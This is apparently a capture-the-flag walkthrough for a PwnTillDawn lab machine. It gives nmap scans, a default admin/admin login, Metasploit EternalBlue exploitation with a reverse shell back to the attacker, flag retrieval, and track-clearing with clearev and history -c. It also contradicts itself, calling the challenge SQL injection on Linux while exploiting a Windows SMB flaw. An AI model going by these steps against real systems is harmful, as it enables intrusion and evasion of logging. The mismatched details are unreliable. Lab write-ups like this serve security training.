# PwnDrive Academy - 10.150.150.11

## Overview

This repository is a walkthrough for the **PwnDrive Academy** from **PwnTillDawn**.
The challenge is to identify, exploit, and remediate a SQL Injection (SQLi) vulnerability in a web application to gain unauthorized access to the Flag.

## Target Information
* **Hostname:** PwnDrive Academy
* **Target IP:** 10.150.150.11 
* **Operating System:** Linux
* **Attacker IP:** 10.66.67.10
* **Difficulty:** Easy

## 1. Reconnaissance

To get our VPN in Kali Linux, open the terminal and put the specific command:

```bash
sudo openvpn PwnTillDawn.ovpn
```
We can see our VPN on the top right.

**Attacker VPN:**
```bash
10.66.67.10
```

Next, used Nmap to perform a "ping sweep" across the local subnet. This allows for rapid identification of active hosts without performing a full port scan, which saves time and reduces network noise.

```bash
nmap -sn 10.150.150.0/24
```

Target Identification

The target IP address was identified as the primary scope for this task to evaluate web-based authentication vulnerabilities.

Target IP Address: ```10.150.150.11```

Status: Confirmed active

## 2. Scanning

The next step was to perform a comprehensive port scan to identify running services, software versions, and the underlying operating system. This information is critical for mapping out potential attack vectors.

```bash
nmap -sC -sV -T4 10.150.150.11
```
**Key Discoveries & Attack Surface:**

The scan returned a wealth of information, revealing a Windows-based environment with multiple potential entry points:

* Operating System: Identified as Windows Server 2008 R2 (via SMB port 445), an older OS which often lacks modern security patches.
*  Web Services (Ports 80 & 443): Running an Apache server hosting a web application titled "PwnDrive - Your Personal Online Storage." This is a primary target for further web vulnerability analysis.
*  File Transfer (Port 21): An active FTP service running Xlight ftpd 3.9.
*  Database (Port 1433): Microsoft SQL Server 2012 is exposed, revealing the network name "PWNDRIVE".

## 3. Gaining Access

**1.Investigating the Web Server**

Next, navigating to ```http://10.150.150.11``` in a web browser.

The browser loads a custom cloud storage application named "PwnDrive." The presence of a "Sign In" button confirms there is a user authentication system. Because this is a file storage application, it immediately becomes a high-priority target for testing login vulnerabilities or malicious file uploads.

**2. testing Default Credintials**

Next, attempting to log in using common credentials.

```bash
username: admin    password: admin
```
The default credentials successfully bypassed the login screen. We are now fully authenticated as the site administrator.

**3. Vulnerability Scanning (Finding EternalBlue)**

Next, go back to Open Terminal and put the command:

```bash
nmap -p445 --script smb-vuln-ms17-010 10.150.150.11
```

This command tells Nmap to only look at port 445, which is the standard port for SMB (Windows file sharing)

The scan explicitly states the target is VULNERABLE to MS17-010. This is a critical Remote Code Execution (RCE) flaw, widely known as EternalBlue. Because the machine is running an outdated Windows Server 2008 OS without the proper security patches, this vulnerability will likely allow us to gain full, system-level control of the server without ever needing a password.

**4. Launching the Exploitation Framework**

Next, we have to enter the Metasploit Framework to execute exploit code against vulnerable targets.

```bash
msfconsole
```

The terminal successfully loads Metasploit, displaying its classic ASCII art banner and version information. 

**5. Searching for the Exploit**

Inside Metasploit, put the ```search``` command looks through its massive database to find any exploit modules, payloads, or scanners related to the keyword you provide.

```bash
search eternal
```
In this case, we are searching for the "EternalBlue" vulnerability we found earlier. Metasploit returned a list of modules related to the MS17-010 vulnerability. The very first result, ```exploit/windows/smb/ms17_010_eternalblue```, is exactly what we need

**6. Selecting the Exploit**

Typing use ```0``` tells Metasploit to load that specific module so we can configure it. You could also type the full path: 
```bash
use 0
```

OR

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

The command prompt changes to red text, indicating we are now actively working inside the EternalBlue module. 

**7. Reviewing Exploit Options**
Before launching an attack, this command displays all the required and optional settings for the selected exploit module and payload. It acts as a pre-flight checklist.

```bash
options
```

The output is divided into two main sections:

* Module options: This controls the exploit itself. Notice that RHOSTS (Remote Hosts - the target IP) is currently blank. We must set this to our target (```10.150.150.11```) before firing.
* Payload options: This controls what happens after the exploit succeeds. LHOST (Local Host) is set to ```10.66.67.10```, which is our Kali Linux machine's IP address. This tells the target exactly where to send the reverse shell connection back to us over port 4444.

**8. Configuring the Target and Listener**

set RHOST to tells Metasploit the exact IP address of the vulnerable machine we want to attack.

```bash
set RHOST 10.150.150.11
```

set LHOST (Local Host): This tells the payload where to connect back to once the exploit succeeds. By setting it to tun0, we are dynamically selecting our VPN tunnel network interface, which automatically resolves to our current attacker IP

```bash
set LHOST tun0
```

The exploit is now fully armed and targeted.

**9. Executing the Exploit & Gaining Access**

Finally, make a exploitation. It tells Metasploit to take all the configurations we just set (RHOST, LHOST, and the payload) and fire the EternalBlue attack at the target.

```bash
exploit
```

The exploit was a total successeful. ```Meterpreter session 1``` opened. This confirms that the target server executed our payload and connected back to Kali machine.

**10. Spawning a System Shell**

While Meterpreter has its own powerful built-in commands, typing ```shell``` drops you directly into a standard Windows Command Prompt (cmd.exe) on the target machine. This lets you interact with the server exactly as if you were typing on its physical keyboard.

```bash
shell
```

The terminal successfully transitions to a classic Windows command line.

**11. Navigating the File System & Finding the Flag**

```cd```(Change Directory): This command lets us move around the server's folders. Using ```..\..\ ``` tells the system to move "up" two levels (getting us out of ```C:\Windows\system32``` and back to the root C:\ drive) so we can enter the Users directory.

```bash
cd ..\..\Users
```

```dir``` (Directory): This simply lists all the files and folders inside our current location.

```bash
dir
```

By listing the ```C:\Users folder```, we discovered several user profiles on the machine (like tony, Jboden, and Administrator). Because our EternalBlue exploit gave us top-tier system privileges, we were able to navigate straight into the ```Administrator``` account without being blocked. Checking their ```Desktop``` folder revealed exactly what we were hunting for **FLAG1.txt**

```bash
C:\Users folder
cd Administratior
dir Desktop
```

To read the FLAG1.txt file, put the command:

```bash
type Desktop\FLAG1.txt
```

Mission accomplished! By reading the file, we successfully captured the final flag:

```PwnTillDawnAcademyIsAwesome!!!```

## 4. Escalate Privilege

In many cybersecurity scenarios, an attacker gains initial access as a low-level user and must find further vulnerabilities to become an Administrator. However, there's not need to perform this step. The EternalBlue exploit (MS17-010) we used is so critical that it automatically grants the highest possible privilege level (NT AUTHORITY\SYSTEM) right upon entry.


## 5. Maintain Access

Creating long-term access methods, such as scheduled tasks or registry modifications, was not required for this engagement. The primary goal was completed upon successful privilege escalation and data retrieval.

## 6. Clearing Tracks

The final step of an engagement is removing evidence of the intrusion to avoid detection.

**The Steps:**

1. Wipe Windows Logs: Inside the ```meterpreter >``` prompt, type the command ```clearev``` to erases the Application, System, and Security event logs on the target Windows machine.

```bash
clearev
```

3. Close the Connection: Type ```exit``` in Meterpreter to cleanly drop the reverse shell connection.

```bash
exit
```

4. Clear Local History (Optional): Back on your own Kali Linux terminal, type ```history -c``` to clear your command-line history, ensuring no record of your specific tools, typos, or target IPs is left behind.

```bash
history -c
```
